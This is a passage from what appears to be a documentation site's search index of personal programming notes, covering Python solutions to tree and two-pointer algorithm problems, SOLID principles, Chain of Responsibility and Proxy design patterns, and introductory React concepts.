down, pass the root.val \n        self.count = 0\n        def dfs(root, prev_max):\n            if not root:\n                return\n\n            if root.val &gt;= prev_max:\n                self.count += 1\n                prev_max = root.val\n\n            dfs(root.right, prev_max)\n            dfs(root.left, prev_max)\n\n        dfs(root, float('-inf'))\n        return self.count\n</code></pre> <p>Another way without using the global variables</p> <pre><code>class Solution:\n    def goodNodes(self, root: TreeNode) -&gt; int:\n        def dfs(root,max_temp):\n            if root is None:\n                return 0\n\n            total = 0\n            if root.val &gt;= max_temp:\n                total = 1\n                max_temp = root.val\n            total += dfs(root.left,max_temp)\n            total += dfs(root.right,max_temp)\n\n            return total\n\n        return dfs(root,-inf)\n</code></pre>"},{"location":"Algorithms/Trees/#valid-binary-search-tree","title":"Valid Binary Search Tree","text":"<p>DFS approach - Better</p> <pre><code>class Solution:\n    def isValidBST(self, root: Optional[TreeNode]) -&gt; bool:\n        def valid(node, left, right):\n            if not node:\n                return True\n            if not (left &lt; node.val &lt; right):\n                return False\n\n            return valid(node.left, left, node.val) and valid(\n                node.right, node.val, right\n            )\n\n        return valid(root, float(\"-inf\"), float(\"inf\"))\n</code></pre> <p>BFS approach</p> <pre><code>class Solution:\n    def isValidBST(self, root: Optional[TreeNode]) -&gt; bool:\n        q = deque([(root, float('-inf'), float('inf'))])\n\n        while q:\n            node, left, right = q.popleft()\n            if not node:\n                continue\n            if not left &lt; node.val &lt; right:\n                return False\n\n            q.append((node.left, left, node.val))\n            q.append((node.right, node.val, right))\n        return True\n</code></pre>"},{"location":"Algorithms/Trees/#kth-smallest-integer-in-bst","title":"Kth Smallest Integer in BST","text":"<pre><code>class Solution:\n    def kthSmallest(self, root: Optional[TreeNode], k: int) -&gt; int:\n        # in order traversal, count\n        self.count = 0\n        self.res = root.val\n        def dfs(root):\n            if not root:\n                return\n\n            dfs(root.left)\n            self.count += 1\n            if self.count == k:\n                self.res = root.val\n            dfs(root.right)\n        dfs(root)\n        return self.res\n</code></pre>"},{"location":"Algorithms/Trees/#construct-binary-tree-from-preorder-and-inorder-traversal","title":"Construct Binary Tree from Preorder and Inorder Traversal","text":"<pre><code># Definition for a binary tree node.\n# class TreeNode:\n#     def __init__(self, val=0, left=None, right=None):\n#         self.val = val\n#         self.left = left\n#         self.right = right\n\nclass Solution:\n    def buildTree(self, preorder: List[int], inorder: List[int]) -&gt; Optional[TreeNode]:\n        if not preorder or not inorder:\n            return None\n\n        root = TreeNode(preorder[0])\n        mid = inorder.index(preorder[0])\n        root.left = self.buildTree(preorder[1 : mid + 1], inorder[:mid])\n        root.right = self.buildTree(preorder[mid + 1 :], inorder[mid + 1 :])\n        return root\n</code></pre>"},{"location":"Algorithms/Trees/#binary-tree-maximum-path-sum","title":"Binary Tree Maximum Path Sum","text":"<pre><code>class Solution:\n    def maxPathSum(self, root: Optional[TreeNode]) -&gt; int:\n        self.res = root.val\n        def dfs(root):\n            if not root:\n                return 0\n\n            left = dfs(root.left)\n            right = dfs(root.right)\n            left_max = max(left, 0)\n            right_max = max(right, 0)\n            # computer max path sum WITH split\n            self.res = max(self.res, root.val + left_max + right_max)\n            # computer max path sum WITHOUT split\n            return root.val + max(left_max, right_max)\n\n        dfs(root)\n        return self.res\n</code></pre>"},{"location":"Algorithms/Two%20Pointers/","title":"Two Pointers","text":""},{"location":"Algorithms/Two%20Pointers/#valid-palindrome","title":"Valid Palindrome","text":"<pre><code>class Solution:\n    def isPalindrome(self, s: str) -&gt; bool:\n        #2 pointers, begine\n        begin = 0\n        end = len(s) - 1\n        def isValid(char):\n            print(char)\n            if char and (48 &lt;= ord(char) &lt;= 57) or (65 &lt;= ord(char) &lt;= 90) or (97 &lt;= ord(char) &lt;= 122):\n                return True\n            return False\n\n        while begin &lt;= end:\n            #skip the white space\n            if isValid(s[begin]) and isValid(s[end]):\n                # print(s[begin], s[end])\n                if s[begin].lower() == s[end].lower():\n                    begin += 1\n                    end -= 1\n                else:\n                    return False\n            elif not isValid(s[begin]):\n                begin += 1\n            elif not isValid(s[end]):\n                end -= 1\n\n        return True\n</code></pre>"},{"location":"Algorithms/Two%20Pointers/#two-sum-il-input-array-is-sorted","title":"Two Sum Il - Input Array Is Sorted","text":"<p>When the input array is sorted, usually there are 2 patterns, use binary search for searching in O(log n) time and O(n) iterations, and 2 pointers in O(n) time.</p> <pre><code>class Solution:\n    def twoSum(self, numbers: List[int], target: int) -&gt; List[int]:\n        l, r = 0, len(numbers) - 1\n\n        while l &lt; r:\n            curSum = numbers[l] + numbers[r]\n\n            if curSum &gt; target:\n                r -= 1\n            elif curSum &lt; target:\n                l += 1\n            else:\n                return [l + 1, r + 1]\n        return []\n</code></pre>"},{"location":"Algorithms/Two%20Pointers/#3sum","title":"3Sum","text":"<pre><code>class Solution:\n    def threeSum(self, nums: List[int]) -&gt; List[List[int]]:\n        # 1 way is to use the hashmap, then similar to 2sums\n        # but we can use sort to optimize it to O(1) space\n        res = []\n        nums.sort()\n\n        for i, num in enumerate(nums):\n            if i &gt; 0 and nums[i] == nums[i - 1]:\n                continue # Skip duplicates\n\n            l, r = i + 1, len(nums) - 1\n            while l &lt; r:\n                total = num + nums[l] + nums[r]\n                if total == 0:\n                    res.append([num, nums[l], nums[r]])\n                    l += 1\n                    r -= 1\n                    while l &lt; r and nums[l] == nums[l - 1]: # still continue to search\n                        l += 1\n                elif total &lt; 0:\n                    l += 1\n                elif total &gt; 0:\n                    r -= 1\n\n        return res\n</code></pre>"},{"location":"Algorithms/Two%20Pointers/#container-with-most-water","title":"Container With Most Water","text":"<pre><code>class Solution:\n    def maxArea(self, heights: List[int]) -&gt; int:\n        # left and right\n        l, r = 0, len(heights) - 1\n        max_area = 0\n\n        while l &lt; r: # Move towards the lower boundary\n            l_max, r_max = heights[l], heights[r]\n\n            area = min(l_max, r_max) * (r - l)\n            max_area = max(max_area, area)\n\n            if l_max &lt; r_max:\n                l += 1\n            else:\n                r -= 1\n\n        return max_area\n</code></pre>"},{"location":"Algorithms/Two%20Pointers/#trapping-rain-water","title":"Trapping Rain Water","text":"<p>The difference between the last question is that we need to keep track of all the water, so instead of comparing the max areas, we need to have another 2 pointers represents the l_max, r_max where indicates that when the l, r moves, the amount of water it can total get.</p> <pre><code>class Solution:\n    def trap(self, height: List[int]) -&gt; int:\n        # increment the counts\n\n        l, r = 0, len(height) - 1\n        l_max, r_max = height[l], height[r]\n        water_area = 0\n\n        while l &lt; r:\n            # Move towards the higher boundary\n            if l_max &lt; r_max:\n                l += 1\n                #check if the new l_max, I more prefer this way although we can use the max() to simplify the code, but this version can illustrate the thinking process better.\n                if height[l] &lt; l_max:\n                    water_area += l_max - height[l]\n                else:\n                    l_max = height[l]\n            else:\n                r -= 1\n                if height[r] &lt; r_max:\n                    water_area += r_max - height[r]\n                else:\n                    r_max = height[r]\n\n        return water_area\n</code></pre>"},{"location":"Algorithms/Two%20Pointers/#summary","title":"Summary","text":"<p>Todo</p>"},{"location":"Design%20Patterns/SOLID/","title":"Design Principles (SOLID)","text":""},{"location":"Design%20Patterns/SOLID/#s-single-responsibility-principle-srp","title":"S - Single Responsibility Principle (SRP)","text":"<p>A class should have one and only one reason to change. Each class should do one thing only.</p> <pre><code>class Journal:\n    def __init__(self):\n        self.entries = []\n        self.count = 0\n\n    def add_entry(self, text):\n        self.entries.append(f\"{self.count}: {text}\")\n        self.count += 1\n\n    def remove_entry(self, pos):\n        del self.entries[pos]\n\n    def __str__(self):\n        return \"\\n\".join(self.entries)\n\n    # break SRP\n    def save(self, filename):\n        file = open(filename, \"w\")\n        file.write(str(self))\n        file.close()\n\n    def load(self, filename):\n        pass\n\n    def load_from_web(self, uri):\n        pass\n\n\nclass PersistenceManager:\n    def save_to_file(journal, filename):\n        file = open(filename, \"w\")\n        file.write(str(journal))\n        file.close()\n\n\nj = Journal()\nj.add_entry(\"I cried today.\")\nj.add_entry(\"I ate a bug.\")\nprint(f\"Journal entries:\\n{j}\\n\")\n\np = PersistenceManager()\nfile = r'c:\\temp\\journal.txt'\np.save_to_file(j, file)\n\n# verify!\nwith open(file) as fh:\n    print(fh.read())\n</code></pre>"},{"location":"Design%20Patterns/SOLID/#o-openclosed-principle-ocp","title":"O - Open/Closed Principle (OCP)","text":"<p>Software entities should be open for extension, but closed for modification. New behavior should be added via extension rather than altering existing code.</p> <p>Benefits:</p> <ul> <li>Avoids touching stable, tested code</li> <li>Reduces the risk of introducing bugs when adding features</li> <li>Encourages use of polymorphism, abstraction, and inheritance or composition</li> </ul> <p>Problem Example (Violates OCP). Here, every time you add a new shape type, you must modify <code>AreaCalculator</code>, violating OCP.</p> <pre><code>class Shape:\n    def __init__(self, type):\n        self.type = type\n\nclass AreaCalculator:\n    def calculate(self, shapes):\n        for shape in shapes:\n            if shape.type == 'circle':\n                # calculate circle area\n            elif shape.type == 'square':\n                # calculate square area\n</code></pre> <p>OCP-Compliant Example (Using Polymorphism)</p> <pre><code>from abc import ABC, abstractmethod\n\nclass Shape(ABC):\n    @abstractmethod\n    def area(self): pass\n\nclass Circle(Shape):\n    def __init__(self, radius):\n        self.radius = radius\n\n    def area(self):\n        return 3.14 * self.radius ** 2\n\nclass Square(Shape):\n    def __init__(self, side):\n        self.side = side\n\n    def area(self):\n        return self.side ** 2\n\nclass AreaCalculator:\n    def calculate(self, shapes):\n        return sum(shape.area() for shape in shapes)\n</code></pre> <p>When to Apply</p> <ul> <li> <p>When a module is stable but requires new features</p> </li> <li> <p>When you want to reduce the impact of future changes</p> </li> <li> <p>In plugin architectures, rule engines, or strategy-based designs</p> </li> </ul> <pre><code>from enum import Enum\n\n\nclass Color(Enum):\n    RED = 1\n    GREEN = 2\n    BLUE = 3\n\n\nclass Size(Enum):\n    SMALL = 1\n    MEDIUM = 2\n    LARGE = 3\n\n\nclass Product:\n    def __init__(self, name, color, size):\n        self.name = name\n        self.color = color\n        self.size = size\n\n\nclass ProductFilter:\n    def filter_by_color(self, products, color):\n        for p in products:\n            if p.color == color:\n                yield p\n\n    def filter_by_size(self, products, size):\n        for p in products:\n            if p.size == size:\n                yield p\n\n    def filter_by_size_and_color(self, products, size, color):\n        for p in products:\n            if p.color == color and p.size == size:\n                yield p\n\n    # state space explosion\n    # 3 criteria\n    # c s w cs sw cw csw = 7 methods\n\n    # OCP = open for extension, closed for modification\n\n\nclass Specification:\n    def is_satisfied(self, item):\n        pass\n\n    # and operator makes life easier\n    def __and__(self, other):\n        return AndSpecification(self, other)\n\n\nclass Filter:\n    def filter(self, items, spec):\n        pass\n\n\nclass ColorSpecification(Specification):\n    def __init__(self, color):\n        self.color = color\n\n    def is_satisfied(self, item):\n        return item.color == self.color\n\n\nclass SizeSpecification(Specification):\n    def __init__(self, size):\n        self.size = size\n\n    def is_satisfied(self, item):\n        return item.size == self.size\n\n\n# class AndSpecification(Specification):\n#     def __init__(self, spec1, spec2):\n#         self.spec2 = spec2\n#         self.spec1 = spec1\n#\n#     def is_satisfied(self, item):\n#         return self.spec1.is_satisfied(item) and \\\n#                self.spec2.is_satisfied(item)\n\n\nclass AndSpecification(Specification):\n    def __init__(self, *args):\n        self.args = args\n\n    def is_satisfied(self, item):\n        return all(map(lambda spec: spec.is_satisfied(item), self.args))\n\n\nclass BetterFilter(Filter):\n    def filter(self, items, spec):\n        for item in items:\n            if spec.is_satisfied(item):\n                yield item\n\n\napple = Product(\"Apple\", Color.GREEN, Size.SMALL)\ntree = Product(\"Tree\", Color.GREEN, Size.LARGE)\nhouse = Product(\"House\", Color.BLUE, Size.LARGE)\n\nproducts = [apple, tree, house]\n\npf = ProductFilter()\nprint(\"Green products (old):\")\nfor p in pf.filter_by_color(products, Color.GREEN):\n    print(f\" - {p.name} is green\")\n\n# ^ BEFORE\n\n# v AFTER\nbf = BetterFilter()\n\nprint(\"Green products (new):\")\ngreen = ColorSpecification(Color.GREEN)\nfor p in bf.filter(products, green):\n    print(f\" - {p.name} is green\")\n\nprint(\"Large products:\")\nlarge = SizeSpecification(Size.LARGE)\nfor p in bf.filter(products, large):\n    print(f\" - {p.name} is large\")\n\nprint(\"Large blue items:\")\n# large_blue = AndSpecification(large, ColorSpecification(Color.BLUE))\nlarge_blue = large &amp; ColorSpecification(Color.BLUE)\nfor p in bf.filter(products, large_blue):\n    print(f\" - {p.name} is large and blue\")\n</code></pre>"},{"location":"Design%20Patterns/SOLID/#l-liskov-substitution-principle-lsp","title":"L - Liskov Substitution Principle (LSP)","text":""},{"location":"Design%20Patterns/SOLID/#i-interface-segregation-principle-isp","title":"I - Interface Segregation Principle (ISP)","text":""},{"location":"Design%20Patterns/SOLID/#d-dependency-inversion-principle-dip","title":"D - Dependency Inversion Principle (DIP)","text":""},{"location":"Design%20Patterns/Structual%20Patterns/Chain%20of%20Responsibility/","title":"Chain of Responsibility","text":""},{"location":"Design%20Patterns/Structual%20Patterns/Chain%20of%20Responsibility/#chain-of-responsibility","title":"Chain of Responsibility","text":"<p>The Chain of Responsibility pattern allows multiple objects the chance to handle a request without the sender needing to know which one will handle it. The request is passed along a chain until an object handles it or the chain ends.</p>"},{"location":"Design%20Patterns/Structual%20Patterns/Chain%20of%20Responsibility/#motivation","title":"Motivation","text":"<p>In real-world scenarios, responsibilities often flow up a hierarchy. For example, in a company, if an employee behaves unethically, the blame may fall on the employee, their manager, or even the CEO\u2014depending on the severity and source of the behavior. This layered delegation is an example of a chain of responsibility.</p> <p>Similarly, in UI applications, when a user clicks a button, the button may handle the event. If it doesn\u2019t, the event bubbles up to the parent component (like a group box), and then possibly to the window itself. Each element in the hierarchy gets a chance to handle the event.</p> <p>Another example is a card game where a creature\u2019s stats (like attack and defense) can be modified by multiple other cards. Each modifier can be seen as a handler in the chain that alters the request.</p> <p>In all these cases, the idea is to:</p> <ul> <li>Pass a request through a chain of handlers</li> <li>Let each handler decide to process or forward it</li> <li>Allow optional early termination of the chain</li> </ul> <p>This pattern is ideal for building flexible, decoupled systems where multiple parties might act on a single input.</p>"},{"location":"Design%20Patterns/Structual%20Patterns/Chain%20of%20Responsibility/#method-chain","title":"Method Chain","text":"<pre><code>class Creature:\n    def __init__(self, name, attack, defense):\n        self.defense = defense\n        self.attack = attack\n        self.name = name\n\n    def __str__(self):\n        return f'{self.name} ({self.attack}/{self.defense})'\n\n\nclass CreatureModifier:\n    def __init__(self, creature):\n        self.creature = creature\n        self.next_modifier = None\n\n    def add_modifier(self, modifier):\n        if self.next_modifier:\n            self.next_modifier.add_modifier(modifier)\n        else:\n            self.next_modifier = modifier\n\n    def handle(self):\n        if self.next_modifier:\n            self.next_modifier.handle()\n\n\nclass NoBonusesModifier(CreatureModifier):\n    def handle(self):\n        print('No bonuses for you!')\n\n\nclass DoubleAttackModifier(CreatureModifier):\n    def handle(self): # in Python, if no init called, the init will get inherited automatically\n        print(f'Doubling {self.creature.name}''s attack')\n        self.creature.attack *= 2\n        super().handle()\n\n\nclass IncreaseDefenseModifier(CreatureModifier):\n    def handle(self):\n        if self.creature.attack &lt;= 2:\n            print(f'Increasing {self.creature.name}''s defense')\n            self.creature.defense += 1\n        super().handle()\n\n\nif __name__ == '__main__':\n    goblin = Creature('Goblin', 1, 1)\n    print(goblin)\n\n    root = CreatureModifier(goblin)\n\n    root.add_modifier(NoBonusesModifier(goblin))\n\n    root.add_modifier(DoubleAttackModifier(goblin))\n    root.add_modifier(DoubleAttackModifier(goblin))\n\n    # no effect\n    root.add_modifier(IncreaseDefenseModifier(goblin))\n\n    root.handle()  # apply modifiers\n    print(goblin)\n</code></pre>"},{"location":"Design%20Patterns/Structual%20Patterns/Chain%20of%20Responsibility/#command-query-separation","title":"Command Query Separation","text":"<ul> <li>Command = asking for an action or change (e.g., please set your attack value to 2).</li> <li>Query = asking for information (e.g., please give me your attack value).</li> <li>CQS = having separate means of sending commands and queries to e.g., direct field access.</li> </ul>"},{"location":"Design%20Patterns/Structual%20Patterns/Chain%20of%20Responsibility/#broker-chain","title":"Broker Chain","text":"<pre><code># 1) event broker\n# 2) command-query separation (cqs)\n# 3) observer\nfrom abc import ABC\nfrom enum import Enum\n\n\nclass Event(list):\n    def __call__(self, *args, **kwargs):\n        for item in self:\n            item(*args, **kwargs)\n\n\nclass WhatToQuery(Enum):\n    ATTACK = 1\n    DEFENSE = 2\n\n\nclass Query:\n    def __init__(self, creature_name, what_to_query, default_value):\n        self.value = default_value  # bidirectional\n        self.what_to_query = what_to_query\n        self.creature_name = creature_name\n\n\nclass Game:\n    def __init__(self):\n        self.queries = Event()\n\n    def perform_query(self, sender, query):\n        self.queries(sender, query)\n\n\nclass Creature:\n    def __init__(self, game, name, attack, defense):\n        self.initial_defense = defense\n        self.initial_attack = attack\n        self.name = name\n        self.game = game\n\n    @property\n    def attack(self):\n        q = Query(self.name, WhatToQuery.ATTACK, self.initial_attack)\n        self.game.perform_query(self, q)\n        return q.value\n\n    @property\n    def defense(self):\n        q = Query(self.name, WhatToQuery.DEFENSE, self.initial_attack)\n        self.game.perform_query(self, q)\n        return q.value\n\n    def __str__(self):\n        return f'{self.name} ({self.attack}/{self.defense})'\n\n\nclass CreatureModifier(ABC):\n    def __init__(self, game, creature):\n        self.creature = creature\n        self.game = game\n        self.game.queries.append(self.handle)\n\n    def handle(self, sender, query):\n        pass\n\n    def __enter__(self):\n        return self\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        self.game.queries.remove(self.handle)\n\n\nclass DoubleAttackModifier(CreatureModifier):\n    def handle(self, sender, query):\n        if (sender.name == self.creature.name and\n                query.what_to_query == WhatToQuery.ATTACK):\n            query.value *= 2\n\n\nclass IncreaseDefenseModifier(CreatureModifier):\n    def handle(self, sender, query):\n        if (sender.name == self.creature.name and\n                query.what_to_query == WhatToQuery.DEFENSE):\n            query.value += 3\n\n\nif __name__ == '__main__':\n    game = Game()\n    goblin = Creature(game, 'Strong Goblin', 2, 2)\n    print(goblin)\n\n    with DoubleAttackModifier(game, goblin):\n        print(goblin)\n        with IncreaseDefenseModifier(game, goblin):\n            print(goblin)\n\n    print(goblin)\n</code></pre>"},{"location":"Design%20Patterns/Structual%20Patterns/Chain%20of%20Responsibility/#exercise","title":"Exercise","text":"<pre><code>import unittest\nfrom abc import ABC\nfrom enum import Enum\n\n# creature removal (unsubscription) ignored in this exercise solution\n\nclass Creature(ABC):\n    def __init__(self, game, attack, defense):\n        self.initial_defense = defense\n        self.initial_attack = attack\n        self.game = game\n\n    @property\n    def attack(self): pass\n\n    @property\n    def defense(self): pass\n\n    def query(self, source, query): pass\n\n\nclass WhatToQuery(Enum):\n    ATTACK = 1\n    DEFENSE = 2\n\n\nclass Goblin(Creature):\n\n    def __init__(self, game, attack=1, defense=1):\n        super().__init__(game, attack, defense)\n\n    @property\n    def attack(self):\n        q = Query(self.initial_attack, WhatToQuery.ATTACK)\n        for c in self.game.creatures:\n            c.query(self, q)\n        return q.value\n\n    @property\n    def defense(self):\n        q = Query(self.initial_defense, WhatToQuery.DEFENSE)\n        for c in self.game.creatures:\n            c.query(self, q)\n        return q.value\n\n    def query(self, source, query):\n        if self != source and query.what_to_query == WhatToQuery.DEFENSE:\n            query.value += 1\n\n\nclass GoblinKing(Goblin):\n\n    def __init__(self, game):\n        super().__init__(game, 3, 3)\n\n    def query(self, source, query):\n        if self != source and query.what_to_query == WhatToQuery.ATTACK:\n            query.value += 1\n        else:\n            super().query(source, query)\n\n\nclass Query:\n    def __init__(self, initial_value, what_to_query):\n        self.what_to_query = what_to_query\n        self.value = initial_value\n\nclass Game:\n    def __init__(self):\n        self.creatures = []\n\n\nclass FirstTestSuite(unittest.TestCase):\n    def test(self):\n        game = Game()\n        goblin = Goblin(game)\n        game.creatures.append(goblin)\n\n        self.assertEqual(1, goblin.attack)\n        self.assertEqual(1, goblin.defense)\n\n        goblin2 = Goblin(game)\n        game.creatures.append(goblin2)\n\n        self.assertEqual(1, goblin.attack)\n        self.assertEqual(2, goblin.defense)\n\n        goblin3 = GoblinKing(game)\n        game.creatures.append(goblin3)\n\n        self.assertEqual(2, goblin.attack)\n        self.assertEqual(3, goblin.defense)\n</code></pre>"},{"location":"Design%20Patterns/Structual%20Patterns/Chain%20of%20Responsibility/#summary","title":"Summary","text":"<p>The Chain of Responsibility pattern enables a sequence of handlers to process a request. Each handler in the chain can choose to act on the request, pass it along, or halt further processing entirely.</p> <p>There are two common implementations:</p> <ul> <li>A linked chain of handlers, where each object holds a reference to the next</li> <li>A centralized dispatcher (e.g., event broker) that maintains a list of handlers and invokes them in order</li> </ul> <p>Key characteristics:</p> <ul> <li>Handlers are organized into a chain, and the request flows through them sequentially</li> <li>Each handler can modify, act on, or terminate the flow</li> <li>Handler order can be managed explicitly to establish priority</li> <li>Handlers can be dynamically added, removed, or self-unregistered</li> </ul> <p>This pattern promotes flexibility and decoupling by allowing multiple objects the opportunity to handle a request without tightly coupling the sender to any specific receiver.</p>"},{"location":"Design%20Patterns/Structual%20Patterns/Proxy/","title":"Proxy","text":""},{"location":"Design%20Patterns/Structual%20Patterns/Proxy/#proxy","title":"Proxy","text":"<p>The Proxy pattern provides a placeholder or surrogate for another object to control access to it. It allows additional behavior (e.g., access control, logging, or lazy loading) while keeping the client interface unchanged.</p>"},{"location":"Design%20Patterns/Structual%20Patterns/Proxy/#motivation","title":"Motivation","text":"<p>In distributed or modular systems, an object like <code>Foo</code> may be relocated to a different process or environment over time. Instead of rewriting all code that interacts with <code>Foo</code>, a proxy class can maintain the same interface while handling the new complexity (e.g., inter-process communication, remote calls).</p> <p>A proxy Structure:</p> <ul> <li>Implements the same interface as the target object.</li> <li>Delegates requests to the real object (optionally adding behavior before or after the call).</li> </ul> <p>Common Use Cases</p> <ul> <li>Remote Proxy (Communication Proxy): Manages communication with an object in a different address space or process.</li> <li>Virtual Proxy: Delays the creation of an expensive object until it\u2019s needed.</li> <li>Logging Proxy: Logs method calls and arguments.</li> <li>Protection (Guard) Proxy: Controls access based on authorization.</li> </ul>"},{"location":"Design%20Patterns/Structual%20Patterns/Proxy/#protection-proxy","title":"Protection Proxy","text":"<p>Use for access control.</p> <pre><code>class Car:\n    def __init__(self, driver):\n        self.driver = driver\n\n    def drive(self):\n        print(f'Car being driven by {self.driver.name}')\n\nclass CarProxy:\n    def __init__(self, driver):\n        self.driver = driver\n        self.car = Car(driver)\n\n    def drive(self):\n        if self.driver.age &gt;= 16:\n            self.car.drive()\n        else:\n            print('Driver too young')\n\n\nclass Driver:\n    def __init__(self, name, age):\n        self.name = name\n        self.age = age\n\n\nif __name__ == '__main__':\n    car = CarProxy(Driver('John', 12))\n    car.drive()\n</code></pre>"},{"location":"Design%20Patterns/Structual%20Patterns/Proxy/#virtual-proxy","title":"Virtual Proxy","text":"<p>The issue is if we initiate the Bitmap object but not drawing the image, it will call the init function which will load image from filename. And also by adding the virtual proxy, it ensures the real object is constructed only on first use, making systems more efficient without changing the public interface.</p> <pre><code>class Bitmap:\n    def __init__(self, filename):\n        self.filename = filename\n        print(f'Loading image from {filename}')\n\n    def draw(self):\n        print(f'Drawing image {self.filename}')\n\n\nclass LazyBitmap:\n    def __init__(self, filename):\n        self.filename = filename\n        self.bitmap = None\n\n    def draw(self):\n        if not self.bitmap:\n            self.bitmap = Bitmap(self.filename)\n        self.bitmap.draw()\n\ndef draw_image(image):\n    print('About to draw image')\n    image.draw()\n    print('Done drawing image')\n\nif __name__ == '__main__':\n    bmp = LazyBitmap('facepalm.jpg')  # Bitmap\n    draw_image(bmp)\n</code></pre>"},{"location":"Design%20Patterns/Structual%20Patterns/Proxy/#proxy-vs-decorator","title":"Proxy vs Decorator","text":"<p>Both Proxy and Decorator patterns involve an object wrapping another, but they serve different design goals. Below is a structured comparison to clarify their purposes and behaviors.</p> <ul> <li>Proxy: Controls access to an object. It may:</li> <li>Delay creation (lazy loading)</li> <li>Add logging, security checks, or communication boundaries</li> <li>Operate before the real object exists</li> <li>Decorator: Adds functionality around an existing object. It enhances behavior without altering the object's core structure.</li> </ul> <p>Think of Proxy as a transparent stand-in that may control object creation, and Decorator as a behavior enhancer that wraps and extends functionality.</p>"},{"location":"Design%20Patterns/Structual%20Patterns/Proxy/#exercise","title":"Exercise","text":"<pre><code>from unittest import TestCase\n\n\nclass Person:\n  def __init__(self, age):\n    self.age = age\n\n  def drink(self):\n    return 'drinking'\n\n  def drive(self):\n    return 'driving'\n\n  def drink_and_drive(self):\n    return 'driving while drunk'\n\nclass ResponsiblePerson:\n  def __init__(self, person):\n    self.person = person\n\n  @property\n  def age(self):\n    return self.person.age\n\n  @age.setter\n  def age(self, value):\n    self.person.age = value\n\n  def drink(self):\n    if self.age &gt;= 18:\n      return self.person.drink()\n    return 'too young'\n\n  def drive(self):\n    if self.age &gt;= 16:\n      return self.person.drive()\n    return 'too young'\n\n  def drink_and_drive(self):\n    return 'dead'\n\nclass Evaluate(TestCase):\n  def test_exercise(self):\n    p = Person(10)\n    rp = ResponsiblePerson(p)\n\n    self.assertEqual('too young', rp.drive())\n    self.assertEqual('too young', rp.drink())\n    self.assertEqual('dead', rp.drink_and_drive())\n\n    rp.age = 20\n\n    self.assertEqual('driving', rp.drive())\n    self.assertEqual('drinking', rp.drink())\n    self.assertEqual('dead', rp.drink_and_drive())\n</code></pre>"},{"location":"Design%20Patterns/Structual%20Patterns/Proxy/#summary","title":"Summary","text":"<p>The Proxy Pattern is a structural design pattern that acts as a stand-in or interface to control access to another object. It maintains the same interface as the original object, allowing clients to interact with the proxy transparently while adding additional behavior like access control, logging, or lazy instantiation.</p> <p>Key proxy types include:</p> <ul> <li>Virtual Proxy \u2013 Delays expensive object creation until first use.</li> <li>Protection Proxy \u2013 Restricts access based on permissions or conditions.</li> <li>Remote Proxy \u2013 Handles interaction across different processes or machines.</li> <li>Logging Proxy \u2013 Adds logging or auditing behavior around method calls.</li> </ul> <p>Proxy is often compared to the Decorator Pattern, but unlike decorators, proxies are used to control access or defer operations, not just enhance behavior. Decorators always work with an existing object, whereas proxies may create or represent an object lazily.</p> <p>Use the Proxy pattern when:</p> <ul> <li>The real object is expensive or unnecessary to initialize upfront</li> <li>Access to the object needs to be controlled or monitored</li> <li>Remote access or security checks are involved</li> </ul>"},{"location":"Full%20Stack/Backend/","title":"Fundamentals of Backend Engineering","text":"<p>Here are my notes for the Udemy course: https://www.udemy.com/course/fundamentals-of-backend-communications-and-protocols/learn/lecture/34629332#overview</p>"},{"location":"Full%20Stack/Backend/#course-outline","title":"Course Outline:","text":""},{"location":"Full%20Stack/Backend/#section2-backend-communication-design-patterns","title":"Section2: Backend Communication Design Patterns","text":""},{"location":"Full%20Stack/React/","title":"ReactJS","text":""},{"location":"Full%20Stack/React/#important-features-of-react","title":"Important Features of React:","text":"<ul> <li>Virtual DOM: React uses a virtual DOM to efficiently update and render components, ensuring fast performance by minimizing direct DOM manipulations. When changes occur, React updates only the necessary parts of the real DOM, instead of re-rendering everything.</li> <li>Component-Based Architecture: React builds UI using reusable, isolated components, making code more modular, maintainable, and scalable.</li> <li>Hooks: React Hooks allow functional components to manage state and side effects, making them powerful and more flexible.</li> <li>Server-Side Rendering (SSR): React can be used for server-side rendering, where HTML content is generated on the server and sent to the client. This improves the app's performance, especially for SEO.</li> <li>React Router: React Router enables navigation in a React application. It allows you to define different routes for different views in a single-page application (SPA).</li> </ul>"},{"location":"Full%20Stack/React/#props-and-state","title":"Props and State","text":"<p>React allows us to pass information to a Component using something called props (which stands for properties). Props are objects which can be used inside a component</p> <p>We can access any props inside from the component\u2019s class to which the props is passed. The props can be accessed as shown below:</p> <p><code>this.props.propName;</code></p>"},{"location":"Full%20Stack/React/#virtual-dom","title":"Virtual DOM","text":""},{"location":"Full%20Stack/React/#real-dom-and-virtual-dom-difference","title":"Real DOM and virtual DOM difference","text":""},{"location":"Full%20Stack/React/#jsx","title":"JSX","text":"<p>JSX is basically a syntax extension of regular JavaScript and is used to create React elements. These elements are then rendered to the React DOM. All the React components are written in JSX. To embed any JavaScript expression in a piece of code written in JSX we will have to wrap that expression in curly braces {}. </p>"},{"location":"Full%20Stack/React/#react-components","title":"React Components","text":""},{"location":"Full%20Stack/React/#functional-component-with-hooks","title":"\u2705 Functional Component (with Hooks)","text":"<pre><code>jsxCopyEditimport React, { useState, useEffect } from 'react';\n\nfunction Counter() {\n  const [count, setCount] = useState(0);\n\n  useEffect(() =&gt; {\n    console.log('Component mounted or updated');\n  }, [count]); // Only runs when `count` changes\n\n  return (\n    &lt;div&gt;\n      &lt;p&gt;You clicked {count} times&lt;/p&gt;\n      &lt;button onClick={() =&gt; setCount(count + 1)}&gt;\n        Click me\n      &lt;/button&gt;\n    &lt;/div&gt;\n  );\n}\n\nexport default Counter;\n</code></pre>"},{"location":"Full%20Stack/React/#react-class-component-oop-class","title":"\ud83e\uddf1 React Class Component = OOP Class","text":"<pre><code>import React, { Component } from 'react';\n\nclass Counter extends Component {\n  constructor(props) {\n    super(props);              // Calls the parent (Component) constructor\n    this.state = { count: 0 }; // Initializes local state\n  }\n\n  componentDidUpdate() {\n    console.log('Component updated');\n  }\n\n  render() {\n    return (\n      &lt;div&gt;\n        &lt;p&gt;You clicked {this.state.count} times&lt;/p&gt;\n        &lt;button onClick={() =&gt; this.setState({ count: this.state.count + 1 })}&gt;\n          Click me\n        &lt;/button&gt;\n      &lt;/div&gt;\n    );\n  }\n}\n</code></pre>"},{"location":"Full%20Stack/React/#shouldcomponentupdate-class","title":"shouldComponentUpdate()  - class","text":"<p>In React, lifecycle methods provide hooks into different phases of a component's lifecycle, enabling developers to control its behaviour at various stages. One such lifecycle method is shouldComponentUpdate().</p> <p>It plays an important role in optimizing component rendering and ensuring that unnecessary updates are avoided, improving the performance of React applications.</p> <p>The shouldComponentUpdate() is a lifecycle method used in React class components to determine whether a component should re-render in response to changes in state or props. This method is invoked before every render and allows you to conditionally skip the re-rendering 